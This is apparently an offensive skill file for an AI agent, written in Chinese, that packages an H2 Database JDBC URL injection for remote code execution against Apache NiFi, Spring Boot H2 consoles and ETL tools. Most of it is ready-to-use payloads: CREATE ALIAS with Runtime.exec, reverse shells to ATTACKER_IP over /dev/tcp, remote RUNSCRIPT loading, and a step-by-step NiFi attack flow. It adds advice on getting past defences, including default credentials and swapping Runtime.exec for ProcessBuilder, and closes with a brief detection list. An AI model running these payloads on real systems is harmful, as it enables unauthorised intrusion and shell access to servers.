---
name: 'h2-java-alias-rce'
description: 'H2 Database Java Alias RCE：JDBC URL注入→CREATE ALIAS→Runtime.exec。适用Apache NiFi/Spring Boot/ETL工具'
disable-model-invocation: true
metadata: { domain: db, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# H2 Database Java Alias RCE

## 核心原理
H2 Database 的 JDBC URL 支持 `INIT=RUNSCRIPT` 和 `INIT=CREATE ALIAS` 参数，允许在连接建立时执行任意 SQL。`CREATE ALIAS` 可以把 Java 方法注册为 SQL 别名——调用这个别名就执行 Java 代码。

## 适用场景
- Apache NiFi `ExecuteSQL` / `DBCPConnectionPool` processor
- Spring Boot H2 Console (`/h2-console`)
- 任何接受 JDBC URL 输入的 ETL/BI/数据流工具
- JHipster 开发模式下的 H2 控制台

## 攻击 Payload

### 方案 A: CREATE ALIAS + CALL（最可靠）

JDBC URL:
```
jdbc:h2:mem:pwn;INIT=CREATE ALIAS PWN AS $$void pwn(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); }$$
```

SQL 触发:
```sql
CALL PWN('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"');
```

### 方案 B: RUNSCRIPT FROM（加载远程 SQL）

JDBC URL:
```
jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://ATTACKER_IP/init.sql'
```

`init.sql`:
```sql
CREATE ALIAS X AS $$ void x(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); } $$;
CALL X('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
```

### 方案 C: 单行版本（不需要额外 SQL）
```sql
CREATE ALIAS EXEC AS $$ void e(String c) throws Exception { Runtime.getRuntime().exec(c); } $$; CALL EXEC('cmd /c whoami');
```

## Apache NiFi 特定攻击流

1. **发现 NiFi**：vhost fuzzing (`flow.helix.htb` on :8080)
2. **访问 Canvas**：`/nifi` UI，可能无认证或弱口令
3. **创建 DBCPConnectionPool Controller Service**：
   ```
   Database Connection URL: jdbc:h2:mem:pwn;INIT=CREATE ALIAS PWN AS $$void pwn(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); }$$
   Database Driver Class: org.h2.Driver
   ```
4. **添加 ExecuteSQL Processor**，SQL: `CALL PWN('...')`
5. **启动 Processor** → NiFi JVM 执行 Java 代码 → Reverse Shell

## 变体：其他 JDBC 驱动的类似漏洞

| 数据库 | 利用方式 |
|--------|---------|
| H2 | `INIT=CREATE ALIAS` / `INIT=RUNSCRIPT FROM` |
| HSQLDB | `CREATE FUNCTION` + Java static method |
| Apache Derby | `SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY` + `derby.language.statementCacheSql` |
| PostgreSQL JDBC | `socketFactory` / `sslfactory` → 加载远程类 |
| MySQL JDBC | `autoDeserialize` / `detectCustomCollations` → 反序列化 |
| Oracle JDBC | `CONNECT_DATA` 属性注入 + log file write |

## 防御绕过
- 如果 NiFi/Spring 有 JAAS 认证 → 先找默认凭据（admin/admin, nifi/nifi）
- 如果 `Runtime.exec` 被 SecurityManager 阻止 → 用 `ProcessBuilder` 替代
- 如果出站受限 → 用 `curl/wget` HTTP 隧道出站
- 如果 NiFi Canvas 禁用 → 直接 POST REST API: `/nifi-api/processors/.../run-status`

## 检测
- JDBC URL 中包含 `CREATE ALIAS`, `RUNSCRIPT`, `INIT=` 字符串
- NiFi 的 `ExecuteSQL` processor 被执行时传入非预期的 JDBC URL
- JVM 子进程（`java...Runtime.exec...`）→ 非预期的 `bash`, `nc`, `curl` 进程
- Network: NiFi server → attacker:4444 (reverse shell) 或 → attacker:80 (RUNSCRIPT FROM)

## 教训
- **任何接受 JDBC URL 的输入点 = 潜在 RCE**（不仅限于 H2）
- NiFi/StreamSets/Camel 等数据流工具的 processor 配置 = 代码执行边界
- 默认安装通常未认证 → 默认即 RCE
- H2 `CREATE ALIAS` + `RUNSCRIPT FROM` + `INIT=` = 攻击铁三角
